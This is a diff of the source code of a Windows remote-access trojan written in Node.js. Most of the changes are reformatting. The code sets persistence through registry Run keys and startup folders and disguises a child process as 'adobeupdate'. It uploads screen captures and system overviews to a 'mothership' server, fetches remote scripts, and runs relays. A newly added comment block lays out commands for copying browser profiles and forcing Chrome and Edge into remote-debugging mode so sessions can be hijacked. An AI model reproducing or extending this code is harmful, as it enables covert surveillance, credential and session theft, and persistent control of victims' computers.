@@ -1,3 +1,5 @@
+// 20260807-1752
+
 debugger;
 
 //#region documentation
@@ -278,11 +280,13 @@ var systemstate = {
     },
 
     get pythonexedir() {
-        return path.join(systemstate.pythondir,
-        "work",
-        "Portable Python-3.10.5 x64",
-        "App",
-        "Python");
+        return path.join(
+            systemstate.pythondir,
+            "work",
+            "Portable Python-3.10.5 x64",
+            "App",
+            "Python"
+        );
     },
 
     get pythonexepath() {
@@ -353,13 +357,13 @@ var systemstate = {
         return path.join(
             this.trojandir,
             "master_" +
-                this.cmdname +
-                (!isNullOrWhitespace(this.cmdtaskname)
-                    ? "_" + this.cmdtaskname
-                    : "") +
-                "_" +
-                this.scriptts +
-                ".log"
+            this.cmdname +
+            (!isNullOrWhitespace(this.cmdtaskname)
+                ? "_" + this.cmdtaskname
+                : "") +
+            "_" +
+            this.scriptts +
+            ".log"
         );
     },
 
@@ -449,13 +453,13 @@ var regstartupconfig = {
     },
 
     get_startup_script(reg_obj) {
-        let txt = '';
+        let txt = "";
         txt = regstartupconfig.get_name_value_str(reg_obj) + "\r\n";
         txt += `$RegistryPath = "${reg_obj.path}"` + "\r\n";
         txt += regstartupconfig.new_item_str;
 
-        if ( [ "startup_hku", "startup_hku_default"].includes(reg_obj.name) ) {
-            return regstartupconfig.new_drive_tag + '\r\n' + txt;
+        if (["startup_hku", "startup_hku_default"].includes(reg_obj.name)) {
+            return regstartupconfig.new_drive_tag + "\r\n" + txt;
         }
 
         return txt;
@@ -477,9 +481,8 @@ var regstartupconfig = {
     get reg_paths() {
         let paths = [];
 
-        for ( const reg of regstartupconfig.regs ) {
-
-            if ( ! systemstate.istpl || reg.name != 'starup_hku_default')
+        for (const reg of regstartupconfig.regs) {
+            if (!systemstate.istpl || reg.name != "starup_hku_default")
                 paths.push(reg.path);
         }
 
@@ -490,7 +493,7 @@ var regstartupconfig = {
         {
             name: "startup_hku",
             get path() {
-                return `HKU:\\${systemstate.usersid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`
+                return `HKU:\\${systemstate.usersid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
             },
             enabled: true,
         },
@@ -510,7 +513,6 @@ var regstartupconfig = {
             enabled: true,
         },
     ],
-
 };
 
 var startupfolderconfig = {
@@ -636,12 +638,15 @@ class CmdConfig {
     #__clientjob = null;
 
     get clientjob() {
-        if ( [ 'cmdlist', 'ping', 'watchdog', 'launch_ping' ].includes(this.cmdname) ) {
+        if (
+            ["cmdlist", "ping", "watchdog", "launch_ping"].includes(
+                this.cmdname
+            )
+        ) {
             return null;
         }
-        
-        if ( this.#__clientjob )
-            return this.#__clientjob;
+
+        if (this.#__clientjob) return this.#__clientjob;
 
         let configfpath = "";
 
@@ -709,7 +714,7 @@ class CmdConfig {
     get jobcode() {
         let configobj = this.config;
 
-        return configobj?.jobcode ?? '';
+        return configobj?.jobcode ?? "";
     }
 
     get childprocess() {
@@ -795,7 +800,7 @@ class CmdConfig {
         cleanup: cleanup,
 
         getsystemoverview: getsystemoverview,
-        getscreencapture: getscreencapture
+        getscreencapture: getscreencapture,
     };
 
     get dynamicdelay() {
@@ -928,7 +933,7 @@ class CmdConfig {
                 reject(
                     new Error(
                         "trojan script does not exists at " +
-                            systemstate.trojanfpath
+                        systemstate.trojanfpath
                     )
                 );
             }
@@ -962,7 +967,7 @@ class CmdConfig {
 
             logmsg(
                 `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
-                    JSON.stringify(child.spawnargs)
+                JSON.stringify(child.spawnargs)
             );
             // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
 
@@ -1045,8 +1050,7 @@ class CmdConfig {
 
             for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
                 logmsg(
-                    `sleeping one second... [${i + 1}/${
-                        systemstate.staticdelay
+                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
                     }]`
                 );
 
@@ -1061,8 +1065,7 @@ class CmdConfig {
 
             for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
                 logmsg(
-                    `sleeping one second... [${i + 1}/${
-                        systemstate.staticdelay
+                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
                     }]`
                 );
                 await sleep(1000);
@@ -1168,9 +1171,9 @@ class PubnubRelay {
 
                 logmsg(
                     "message sent -- timetoken:" +
-                        response.timetoken +
-                        " payloads: " +
-                        this.payloads.length
+                    response.timetoken +
+                    " payloads: " +
+                    this.payloads.length
                 );
             })
             .catch((error) => {
@@ -1593,7 +1596,6 @@ function logmsg(msgstr) {
 
     if (systemstate)
         fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
-
 }
 
 function getTimestamp() {
@@ -2203,33 +2205,22 @@ function execPSScript(
     let child = spawn("powershell.exe", cmdlineargsarr, execopts);
 
     child.stdout.on("data", (data) => {
-
         let text = data.toString();
 
-        if (stdoutfunc) 
-            stdoutfunc(text);
-        else
-            logmsg(text);
-
+        if (stdoutfunc) stdoutfunc(text);
+        else logmsg(text);
     });
 
     child.stderr.on("data", (data) => {
         let text = data.toString();
 
-        if (stderrfunc) 
-            stderrfunc(text);
-        else
-            logmsg(text);
-
+        if (stderrfunc) stderrfunc(text);
+        else logmsg(text);
     });
 
     child.on("close", (code) => {
-
-        if ( closefunc ) 
-            closefunc(code);
-        else
-            logmsg(`Child process exited with code ${code}`);
-
+        if (closefunc) closefunc(code);
+        else logmsg(`Child process exited with code ${code}`);
     });
 
     child.unref();
@@ -2491,9 +2482,9 @@ function execCMDScript(scriptfpath, cmdlineargsarr) {
 
     logmsg(
         "spawning process: " +
-            scriptfpath +
-            " cmdlineargsarr: " +
-            cmdlineargsarr.join()
+        scriptfpath +
+        " cmdlineargsarr: " +
+        cmdlineargsarr.join()
     );
 
     const child = spawn(
@@ -2516,7 +2507,7 @@ function execCMDScript(scriptfpath, cmdlineargsarr) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs)
+        JSON.stringify(child.spawnargs)
     );
 
     logmsg("finished");
@@ -2536,18 +2527,20 @@ function writeToChildProcess(child, msg) {
     }
 }
 
-function runpythonrelay(pubnubo, browser = "chrome") {
+function runpythonrelay(browser = "chrome") {
     let configfpath = path.join(
         systemstate.trojandir,
         "pythonrelay.py_" + getRandomCode(8) + "_config.json"
     );
 
     let jsontext = JSON.stringify({
-        browser: "msedge",
-        batchid: getRandomCode(8),
+        browser: browser || "chrome",
+        batchid: getRandomCode(8), // TODO why is batchid needed here?
     });
 
     fs.writeFileSync(configfpath, jsontext);
+
+    // TODO check if python is installed, working
 
     return execPYTHONScript(
         path.join(systemstate.trojandir, "pythonrelay.py"),
@@ -2609,7 +2602,7 @@ function runpsrelay(pubnubo) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs)
+        JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -2676,7 +2669,7 @@ function runnoderelay(pubnubo) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs)
+        JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -2740,7 +2733,7 @@ function runbatrelay(pubnubo) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs)
+        JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -2755,15 +2748,15 @@ function launchrelay(tenginename, tpubnubr, browsername) {
     logmsg(`launching: ${tenginename}, ${tpubnubr}, ${browsername}`);
 
     if (tenginename == "JS") {
-        tchildp = runnoderelay(tpubnubr); // TODO modify to include browsername
+        tchildp = runnoderelay(tpubnubr);
     } else if (tenginename == "BAT") {
         tchildp = runbatrelay(tpubnubr);
     } else if (tenginename == "PS1") {
         tchildp = runpsrelay(tpubnubr);
     } else if (tenginename == "PY") {
-        tchildp = runpythonrelay(tpubnubr, browsername);
+        tchildp = runpythonrelay(browsername);
     } else if (tenginename == "VBS") {
-        tchildp = runvbsrelay(tpubnubr);
+        throw new Error("VBS relay is not supported");
     }
 
     return tchildp;
@@ -2776,14 +2769,17 @@ function relay() {
 
     let clientjob = relaycmd.clientjob;
 
-    if ( clientjob == null ) {
-        throw new Error('cannot start relay without client job');
+    if (clientjob == null) {
+        logmsg("cannot start relay without client job");
+        process.exit(1);
     }
 
     let args = clientjob.args || [];
 
-    if ( args.length == 0 ) {
-        throw new Error('cannot start relay as clientjob does not specify args');
+    if (args.length == 0) {
+        throw new Error(
+            "cannot start relay as clientjob does not specify args"
+        );
     }
 
     let enginename = args[0];
@@ -2793,15 +2789,15 @@ function relay() {
         throw new Error("enginename is missing");
     }
 
-    if ( ! [ 'PY', 'JS', 'BAT', 'PS1' ].includes(enginename) ) {
+    if (!["PY", "JS", "BAT", "PS1"].includes(enginename)) {
         throw new Error(`engine is not supported: ${enginename}`);
     }
 
-    let browsername = '';
+    let browsername = "";
 
-    if ( enginename == 'PY' ) {
-        if ( args.length <= 0 ) {
-            browsername = 'chrome';
+    if (enginename == "PY") {
+        if (args.length <= 0) {
+            browsername = "chrome";
             logmsg(`defaulting to browsername=${browsername}`);
         } else {
             browsername = args[1];
@@ -2993,7 +2989,7 @@ function cmdlist_handlecmdjob(clientjob) {
     } else {
         let jobcmd = cmdlistcmd.newCmdConfig(cmdname);
 
-        if ( ! jobcmd ) {
+        if (!jobcmd) {
             throw new Error(`could not create child cmd ${cmdname}`);
         }
 
@@ -3001,7 +2997,7 @@ function cmdlist_handlecmdjob(clientjob) {
             logmsg(JSON.stringify(msg));
         };
 
-        let ret = jobcmd.launch( [ clientjob['configfpath'] ] ); // TODO refactor such that launch func grabs clientjob from jobcmd
+        let ret = jobcmd.launch([clientjob["configfpath"]]); // TODO refactor such that launch func grabs clientjob from jobcmd
 
         jobcmd.childprocess.unref();
     }
@@ -3039,8 +3035,8 @@ async function cmdlist_handleMessage(msg) {
 
     fs.writeFileSync(configfpath, JSON.stringify(clientjob));
 
-    clientjob['configfpath'] = configfpath;
-    
+    clientjob["configfpath"] = configfpath;
+
     if (!fileExists(configfpath)) {
         throw new Error(`clientjobconfigpath does note exist ${configfpath}`);
     }
@@ -3154,9 +3150,8 @@ async function exec_ps_cmd(psScript) {
 }
 
 async function penetrate_reg() {
-
-    for ( const reg of regstartupconfig.regs ) {
-        let script_text = '';
+    for (const reg of regstartupconfig.regs) {
+        let script_text = "";
         try {
             script_text = regstartupconfig.get_startup_script(reg);
             let ret = await exec_ps_cmd(script_text);
@@ -3208,7 +3203,7 @@ function penetrate_folders() {
 async function penetrate() {
     logmsg("starting");
 
-    if ( ISDEBUG ) {
+    if (ISDEBUG) {
         process.exit(0);
     }
 
@@ -3587,10 +3582,10 @@ function verify_python_download() {
             logmsg(`file does not exist ${fpath}`);
             filenames_out.push(filename);
             continue;
-        } 
+        }
 
         const stats = fs.statSync(fpath);
-        
+
         // disk1.gsd --> 1,696
         // disk735.gsd --> 65,443
         // 100,000
@@ -3608,7 +3603,9 @@ function verify_python_download() {
         } else {
             if (stats.size != 100000) {
                 filenames_out.push(filename);
-                logmsg(`file not the correct size ${fpath} ${stats.size} 65443`);
+                logmsg(
+                    `file not the correct size ${fpath} ${stats.size} 65443`
+                );
             }
         }
     }
@@ -3635,7 +3632,9 @@ async function verify_python_install() {
                 text = text ?? "ERROR_EMPTY_OUTPUT";
 
                 if (!text.includes("Python 3.10.5")) {
-                    logmsg(`python install failed -- could not verify python version ${text}`);
+                    logmsg(
+                        `python install failed -- could not verify python version ${text}`
+                    );
                     return false;
                 }
             }
@@ -3647,6 +3646,7 @@ async function verify_python_install() {
     return true;
 }
 
+// TODO install all modules psutil -- python -m pip install psutil
 async function install_python() {
     logmsg("starting");
 
@@ -3669,23 +3669,26 @@ async function install_python() {
     // TODO verify file MD5
 
     let filenames = [];
-    if ( ! folderExists(systemstate.gsdfilesdir) ) {
+    if (!folderExists(systemstate.gsdfilesdir)) {
         filenames = get_python_install_filenames();
     } else {
         filenames = verify_python_download();
     }
 
-    if ( filenames && filenames.length > 0 ) {
+    if (filenames && filenames.length > 0) {
         let ret = await download_python(filenames);
     }
 
     filenames = verify_python_download();
 
-    if (filenames && filenames.length > 0 ) {
-        throw new Error("python download failed: install files are missing or invalid "+JSON.stringify(filenames));
+    if (filenames && filenames.length > 0) {
+        throw new Error(
+            "python download failed: install files are missing or invalid " +
+            JSON.stringify(filenames)
+        );
     }
 
-    logmsg('python pieces exist -- proceeding with gunite step');
+    logmsg("python pieces exist -- proceeding with gunite step");
 
     let args = [
         path.join(systemstate.gsdfilesdir, "disk1.gsd"),
@@ -3711,10 +3714,12 @@ async function install_python() {
     const stats = fs.statSync(fpath);
     const zipsize = 72890982;
     if (!stats.size == zipsize) {
-        throw new Error(`incorrect file size ${stats.size} expected ${zipsize}`);
+        throw new Error(
+            `incorrect file size ${stats.size} expected ${zipsize}`
+        );
     }
 
-    logmsg('gunite step successful -- proceeding with unzip step');
+    logmsg("gunite step successful -- proceeding with unzip step");
 
     args = [
         "x",
@@ -3733,7 +3738,7 @@ async function install_python() {
     verify_python = await verify_python_install();
 
     if (!verify_python) {
-        throw new Error('python install failed');
+        throw new Error("python install failed");
     }
 
     process.exit(0);
@@ -3744,8 +3749,11 @@ async function install_python() {
 async function download_python(filenames) {
     logmsg("starting");
 
-    filenames = filenames ?? [];   
-    filenames = ( Array.isArray(filenames) && filenames.length > 0) ? filenames : get_python_install_filenames();
+    filenames = filenames ?? [];
+    filenames =
+        Array.isArray(filenames) && filenames.length > 0
+            ? filenames
+            : get_python_install_filenames();
 
     for (let i = 0; i < filenames.length; i++) {
         let filename = filenames[i];
@@ -4035,8 +4043,6 @@ async function pspcmon() {
 }
 
 function getDirInfo(dirPath) {
-    
-
     const files = fs.readdirSync(dirPath);
 
     const fileDetails = files.map((file) => {
@@ -4057,7 +4063,7 @@ function getDirInfo(dirPath) {
 
 // TODO remove and replace with retrieve_asset
 async function download_screencapture_script() {
-    let filename = 'get_full_screen_capture.ps1'; // TODO move to systemconfig
+    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
 
     let baseUrl = systemstate.mothershipassets + "/" + filename;
     let localpath = path.join(systemstate.trojandir, filename);
@@ -4070,7 +4076,7 @@ async function download_screencapture_script() {
 
     let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
 
-    if ( ! fileExists(localpath) ) {
+    if (!fileExists(localpath)) {
         throw new Error("download failed for " + localpath);
     }
 
@@ -4079,68 +4085,68 @@ async function download_screencapture_script() {
 }
 
 async function upload_file(filename, jobcode, localfpath) {
-
-    if ( isNullOrWhitespace(filename) ) {
-        throw new Error('filename is null or empty');
+    if (isNullOrWhitespace(filename)) {
+        throw new Error("filename is null or empty");
     }
 
-    if ( ! fileExists(localfpath) ) {
+    if (!fileExists(localfpath)) {
         throw new Error(`file does not exist ${localfpath}`);
     }
 
     let baseUrl = systemstate.mothership + "/ow/upload.php";
 
     let kvp = systemstate.statekvp;
-    kvp['filename'] = filename;
-    kvp['jobcode'] = jobcode;
+    kvp["filename"] = filename;
+    kvp["jobcode"] = jobcode;
 
-    let response = await makePUTRequest(
-        baseUrl,
-        kvp,
-        null,
-        localfpath
-    );
+    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);
 
     return response;
 }
 
-
 function exec_getscreencapture() {
-
     return new Promise((resolve, reject) => {
-        let stdout = '';
+        let stdout = "";
 
-        let fpath = path.join(systemstate.trojandir, 'get_full_screen_capture.ps1');
-    
-        let childp = execPSScript(fpath, 
-            [ systemstate.trojandir ], 
-            null, 
-            (text) => stdout+=text, 
-            (text) => stdout+=text, 
-            (code)=>{ resolve(stdout); });
+        let fpath = path.join(
+            systemstate.trojandir,
+            "get_full_screen_capture.ps1"
+        );
+
+        let childp = execPSScript(
+            fpath,
+            [systemstate.trojandir],
+            null,
+            (text) => (stdout += text),
+            (text) => (stdout += text),
+            (code) => {
+                resolve(stdout);
+            }
+        );
     });
 }
 
 async function getscreencapture() {
-
     logmsg("starting");
-    
+
     let runningcmd = systemstate.cmdconfig;
 
     let ret = null;
 
-    ret = await logMsgMothership(`starting getscreencapture -- jobcode=${runningcmd.jobcode}`);
+    ret = await logMsgMothership(
+        `starting getscreencapture -- jobcode=${runningcmd.jobcode}`
+    );
 
-    ret = await logEventMothership('job_started',runningcmd.jobcode);
-    
-    let filename = 'get_full_screen_capture.ps1'; // TODO move to systemconfig
+    ret = await logEventMothership("job_started", runningcmd.jobcode);
+
+    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
     let localpath = path.join(systemstate.trojandir, filename);
 
-    if ( ! fileExists(localpath) ) {
+    if (!fileExists(localpath)) {
         let response = await download_screencapture_script();
     }
 
-    if ( ! fileExists(localpath) ) {
+    if (!fileExists(localpath)) {
         throw new Error(`screencapture script does not exist ${localpath}`);
     }
 
@@ -4148,21 +4154,21 @@ async function getscreencapture() {
 
     let lines = stdout.split(/\r?\n/);
 
-    for ( let i = 0; i<lines.length; i++ ) {
+    for (let i = 0; i < lines.length; i++) {
         let line = lines[i];
-        
-        if ( line.startsWith('filepath=') ) {
-            let fpath = line.split('=')[1];
+
+        if (line.startsWith("filepath=")) {
+            let fpath = line.split("=")[1];
             let fname = path.basename(fpath);
 
-            let ret = await upload_file(fname,runningcmd.jobcode,fpath);
+            let ret = await upload_file(fname, runningcmd.jobcode, fpath);
 
             // TODO logmsg file upload
         }
     }
-    
-    ret = await logEventMothership('job_finished',runningcmd.jobcode);
-    
+
+    ret = await logEventMothership("job_finished", runningcmd.jobcode);
+
     // job_finished_with_error
 
     process.exit(0);
@@ -4189,24 +4195,28 @@ function query_reg(reg_path) {
 }
 
 function errorToJson(error) {
-    const errorString = JSON.stringify(error, (key, value) => {
-        if (value instanceof Error) {
-          return {
-            name: value.name,
-            message: value.message,
-            stack: value.stack,
-            ...value // Captures any custom properties attached to the error
-          };
-        }
-        return value;
-    }, 2);
+    const errorString = JSON.stringify(
+        error,
+        (key, value) => {
+            if (value instanceof Error) {
+                return {
+                    name: value.name,
+                    message: value.message,
+                    stack: value.stack,
+                    ...value, // Captures any custom properties attached to the error
+                };
+            }
+            return value;
+        },
+        2
+    );
 
     return errorString;
 }
 
 async function getsystemoverview() {
     logmsg("starting");
-   
+
     let runningcmd = systemstate.cmdconfig;
     let config = runningcmd.config;
 
@@ -4228,7 +4238,7 @@ async function getsystemoverview() {
 
     let reg_snapshot = await Promise.all(
         regstartupconfig.reg_paths.map(async (reg_path) => {
-            let ret = await query_reg(reg_path.replaceAll(':', ''));
+            let ret = await query_reg(reg_path.replaceAll(":", ""));
             return ret;
         })
     );
@@ -4237,7 +4247,7 @@ async function getsystemoverview() {
         startupfolderconfig.folderpaths.map(async (folderpath) => {
             try {
                 return getDirInfo(folderpath);
-            } catch ( error ) {
+            } catch (error) {
                 return errorToJson(error);
             }
         })
@@ -4262,33 +4272,79 @@ async function getsystemoverview() {
 
     let baseUrl = systemstate.mothership + "/ow/upload.php";
 
-    let filename = 'getsystemoverview.out';
+    let filename = "getsystemoverview.out";
 
     let kvp = systemstate.statekvp;
-    kvp['filename'] = filename;
-    kvp['jobcode'] = runningcmd.jobcode;
+    kvp["filename"] = filename;
+    kvp["jobcode"] = runningcmd.jobcode;
 
-    let response = await makePUTRequest(
-        baseUrl,
-        kvp,
-        null,
-        localfpath
-    );
+    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);
 
     logmsg(JSON.stringify(response));
 
     process.exit(0);
 }
 
+async function setup_msedge_relay() {
+
+}
+
+// TODO
+async function setup_chrome_relay() {
+
+    // 1. modify shotfut lnk file in taskbar and start menu, etc.
+    // 2. modify registry paths as needed
+    // 3. robocopy user data dir
+    // 4. execute curl test
+
+    // chrome rdp mods
+    // robocopy "C:\Users\sebas\AppData\Local\Google\Chrome\User Data" C:\ProgramData\owd\chrome /E /R:0 /W:0
+    // "C:\Program Files\Google\Chrome\Application\chrome.exe" --user-data-dir="C:\ProgramData\owd\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --ignore-certificate-errors --remote-debugging-port=9223
+    // HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command
+    // "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 -- "%1"
+    // reg add HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files\Google\Chrome\Application\chrome.exe\" --remote-debugging-port=9223 -- \"^%1\"" /f
+
+    // msedge rdp mods
+    // robocopy "C:\Users\sebas\AppData\Local\Microsoft\Edge\User Data" C:\ProgramData\owd\msedge /E /W:0
+    // msedge.exe --remote-debugging-port=9222 --user-data-dir="C:\ProgramData\owd\msedge"
+    // reg add "HKLM\Software\Policies\Microsoft\Edge" /v "RemoteDebuggingAllowed" /t REG_DWORD /d 1 /f > %workdir%\mod_msedge.bat
+    // reg add "HKCU\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments" /v "msedge.exe" /t REG_SZ /d "--remote-debugging-port=9222" /f >> %workdir%\mod_msedge.bat
+    // Startup-Boost: Pre-loads portions of msedge upon system boot so the application 
+    // opens instantly on demand
+    // reg add HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --remote-debugging-port=9222 -- \"^%1\"" /f
+    // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    // MicrosoftEdgeAutoLaunch_5B148DE90C207DD5EDAA5B34E614DD84    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
+    // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk
+    // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
+    // taskkill /F /IM msedge.exe
+    // start "" /min "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default --remote-allow-origins=* --restore-last-session --user-data-dir="C:\ProgramData\owd\msedge"
+
+    // shortcut folders
+    // %AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
+    // %ProgramData%\Microsoft\Windows\Start Menu\Programs
+    // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
+
+    // Desktop Shortcut:             C:\Users\<YourUsername>\Desktop
+    // Start Menu:                   C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
+    // Taskbar Pinned Items:         C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
+    // Chrome App/Website Shortcuts: C:\Users\<YourUsername>\AppData\Local\Google\Chrome\User Data\Default\Web Applications
+
+    // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
+    // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice
+
+    // curl -v -G http://localhost:9223/json
+    // curl -s http://localhost:9223/json/list | findstr webSocketDebuggerUrl | findstr ws://
+}
+
 // ---
 
-async function logMsgMothership(msg, isevent=false, jobcode) {
-    let baseUrl = systemstate.mothership + '/ow/logmsg.php';
+async function logMsgMothership(msg, isevent = false, jobcode) {
+    let baseUrl = systemstate.mothership + "/ow/logmsg.php";
 
     let kvp = systemstate.statekvp;
 
-    kvp[isevent ? 'event' : 'msg'] = msg;
-    kvp['jobcode'] = jobcode;
+    kvp[isevent ? "event" : "msg"] = msg;
+    kvp["jobcode"] = jobcode;
 
     let response = await makeGetRequest(baseUrl, kvp);
     return response;
